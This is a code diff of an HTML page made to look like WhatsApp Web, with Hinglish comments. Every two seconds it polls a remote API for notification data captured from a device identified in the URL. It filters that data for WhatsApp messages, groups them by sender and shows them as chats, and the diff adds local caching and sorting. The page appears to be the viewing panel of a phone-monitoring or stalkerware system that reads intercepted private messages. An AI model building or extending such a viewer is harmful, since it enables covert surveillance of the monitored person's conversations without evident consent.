@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web</title>
+    <title>WhatsApp Web (Saved)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         /* --- CSS STYLES --- */
@@ -16,14 +16,13 @@
         .contact-list { flex: 1; overflow-y: auto; }
         
         /* Contact Item Styling */
-        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; height: 50px; } /* Fixed height */
+        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; height: 50px; } 
         .contact:hover { background-color: #2a3942; }
         .contact.active { background-color: #2a3942; }
 
         .avatar { width: 45px; height: 45px; background-color: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 15px; flex-shrink: 0; font-size: 18px; font-weight: bold; }
         .info { flex: 1; display: flex; align-items: center; }
         .name { font-size: 17px; color: #e9edef; font-weight: 500; }
-        /* Removed .last-msg style entirely since you don't want it */
 
         /* Right Chat Area */
         .chat-area { flex: 1; display: flex; flex-direction: column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; position: relative; }
@@ -58,7 +57,10 @@
     <div class="sidebar" id="sidebar">
         <div class="header">
             <span>Chats</span>
-            <i class="fas fa-sync-alt" onclick="fetchData()" style="cursor:pointer;" title="Refresh"></i>
+            <div style="display:flex; gap:15px;">
+                <i class="fas fa-trash" onclick="clearData()" style="cursor:pointer; font-size:14px;" title="Clear Saved Data"></i>
+                <i class="fas fa-sync-alt" onclick="fetchData()" style="cursor:pointer;" title="Refresh"></i>
+            </div>
         </div>
         <div class="contact-list" id="contactList">
             <div style="text-align:center; padding:20px; color:#8696a0;">Loading...</div>
@@ -69,6 +71,7 @@
         <div class="welcome-screen" id="welcomeScreen">
             <i class="fab fa-whatsapp" style="font-size: 60px; color: #3d4a51; margin-bottom: 20px;"></i>
             <div style="font-size: 24px;">WhatsApp Web</div>
+            <div style="font-size: 14px; color: #8696a0; margin-top: 10px;">Messages are saved locally</div>
         </div>
 
         <div class="chat-header" id="chatHeader" style="display:none;">
@@ -84,11 +87,24 @@
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
         const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
+        
+        // UNIQUE KEY FOR STORAGE (Device ID ke hisaab se alag-alag save hoga)
+        const STORAGE_KEY = `whatsapp_data_${deviceId || 'default'}`;
 
         let groupedChats = {};
-        let activeChatUser = null; // Track kaunsa chat open hai
+        let activeChatUser = null; 
 
-        // 1. Fetch Data
+        // 1. Load Data from LocalStorage (Instant Show)
+        function loadFromStorage() {
+            const savedData = localStorage.getItem(STORAGE_KEY);
+            if (savedData) {
+                groupedChats = JSON.parse(savedData);
+                renderSidebar(); // Turant render kar do
+                console.log("Loaded from Storage");
+            }
+        }
+
+        // 2. Fetch New Data
         async function fetchData() {
             if (!deviceId) return;
             try {
@@ -98,47 +114,64 @@
                 // Filter WhatsApp
                 const filtered = data.filter(d => (d.packageName || "").includes("whatsapp") || (d.appName || "").toLowerCase().includes("whatsapp"));
                 
-                // Sort Newest First (Sidebar Sorting)
-                filtered.sort((a, b) => b.postTime - a.postTime);
-                
                 processChats(filtered);
             } catch (e) { console.error(e); }
         }
 
-        // 2. Process & Auto Refresh Logic
+        // 3. Process & Save
         function processChats(data) {
-            groupedChats = {};
+            let tempGrouped = {}; // Temporary object
+            
+            // Re-build grouping from new data
             data.forEach(msg => {
                 const name = msg.title || "Unknown";
-                if (!groupedChats[name]) groupedChats[name] = [];
-                groupedChats[name].push(msg);
+                if (!tempGrouped[name]) tempGrouped[name] = [];
+                tempGrouped[name].push(msg);
             });
+
+            // Agar naya data khali hai, to purana mat udao (optional safety)
+            if (Object.keys(tempGrouped).length > 0) {
+                groupedChats = tempGrouped;
+                
+                // 🔥 SAVE TO LOCALSTORAGE
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(groupedChats));
+            }
 
             renderSidebar();
 
-            // 🔥 AUTO REFRESH LOGIC:
-            // Agar koi chat khuli hai (activeChatUser), to usse turant update karo
             if (activeChatUser) {
                 renderMessages(activeChatUser, true); 
             }
         }
 
-        // 3. Render Sidebar (Name ONLY - No Message Text)
+        // 4. Render Sidebar (Sorted by Time)
         function renderSidebar() {
             const list = document.getElementById('contactList');
-            // Hum list ko tabhi clear karenge agar user scroll nahi kar raha, 
-            // lekin simplicity ke liye abhi pura replace kar rahe hain
             list.innerHTML = "";
             
-            Object.keys(groupedChats).forEach(name => {
+            // Sort Chats by Last Message Time
+            // Object.keys se naam nikalo -> Sort karo -> Loop chalao
+            const sortedNames = Object.keys(groupedChats).sort((a, b) => {
+                const msgsA = groupedChats[a];
+                const msgsB = groupedChats[b];
+                // Sabse last message ka time compare karo
+                const timeA = msgsA[msgsA.length - 1]?.postTime || 0;
+                const timeB = msgsB[msgsB.length - 1]?.postTime || 0;
+                return timeB - timeA; // Newest first
+            });
+
+            if (sortedNames.length === 0) {
+                list.innerHTML = `<div style="text-align:center; padding:20px; color:#8696a0;">No chats found</div>`;
+                return;
+            }
+
+            sortedNames.forEach(name => {
                 const div = document.createElement('div');
                 div.className = 'contact';
-                // Active class add karo agar ye chat khuli hai
                 if (name === activeChatUser) div.classList.add('active');
                 
                 div.onclick = () => openChat(name);
                 
-                // HTML UPDATE: Sirf Avatar aur Name (Message gayab)
                 div.innerHTML = `
                     <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                     <div class="info">
@@ -149,9 +182,8 @@
             });
         }
 
-        // 4. Open Chat Setup (UI Toggle)
         function openChat(name) {
-            activeChatUser = name; // Set Global Active User
+            activeChatUser = name;
             
             document.body.classList.add('chat-active');
             document.getElementById('welcomeScreen').style.display = 'none';
@@ -159,45 +191,31 @@
             document.getElementById('headerName').innerText = name;
             document.getElementById('headerAvatar').innerText = name.charAt(0).toUpperCase();
 
-            // Sidebar highlight update
             renderSidebar(); 
-
-            // Messages Render karo
             renderMessages(name, false); 
         }
 
-        // 5. Render Messages (Logic Alag kiya taaki auto-refresh ho sake)
         function renderMessages(name, isAutoRefresh) {
             const box = document.getElementById('messageBox');
-            
-            // Agar user purana message padh raha hai (scrolled up), to scroll mat hilao
             const isScrolledToBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 50;
 
-            if (!groupedChats[name]) return; // Safety check
+            if (!groupedChats[name]) return;
 
-            // Messages Sort: Oldest -> Newest
             let rawMsgs = groupedChats[name].sort((a, b) => a.postTime - b.postTime);
             let uniqueMsgs = [];
             let lastText = "";
 
-            // --- FILTER LOGIC (Single & Bundle Fix) ---
             rawMsgs.forEach(msg => {
                 let currentText = msg.text.trim();
                 if (!currentText) return;
-                if (currentText === lastText) return; // Exact duplicate removal
-                
-                // Bundle Removal Logic
+                if (currentText === lastText) return;
                 if (lastText.length > 0 && currentText.includes(lastText) && currentText.length > lastText.length) {
                     return; 
                 }
-
                 uniqueMsgs.push(msg);
                 lastText = currentText;
             });
 
-            // HTML Generate
-            // Note: Hum pura HTML replace kar rahe hain taaki naye messages dikh sakein
-            // Efficiency ke liye future me append use kar sakte hain, par abhi stability first.
             let htmlContent = "";
             uniqueMsgs.forEach(msg => {
                 htmlContent += `
@@ -209,21 +227,35 @@
 
             box.innerHTML = htmlContent;
 
-            // Scroll Logic: Agar pehle bottom pe tha ya first load hai, to bottom pe le jao
             if (!isAutoRefresh || isScrolledToBottom) {
                 box.scrollTop = box.scrollHeight;
             }
         }
 
         function closeChat() {
-            activeChatUser = null; // Reset active user
+            activeChatUser = null;
             document.body.classList.remove('chat-active');
-            renderSidebar(); // Highlight remove karne ke liye
+            renderSidebar();
         }
 
-        // Initial Start
+        // Clear Data Function (Optional utility)
+        function clearData() {
+            if(confirm("Are you sure you want to clear saved chats?")) {
+                localStorage.removeItem(STORAGE_KEY);
+                location.reload();
+            }
+        }
+
+        // --- STARTUP LOGIC ---
+        // Step 1: Pehle LocalStorage se data uthao (Instant Load)
+        loadFromStorage();
+        
+        // Step 2: Fir API se naya data lao (Background Update)
         fetchData();
-        setInterval(fetchData, 2000); // Har 2 second me refresh
+        
+        // Step 3: Har 2 second me refresh karte raho
+        setInterval(fetchData, 2000);
+
     </script>
 </body>
 </html>
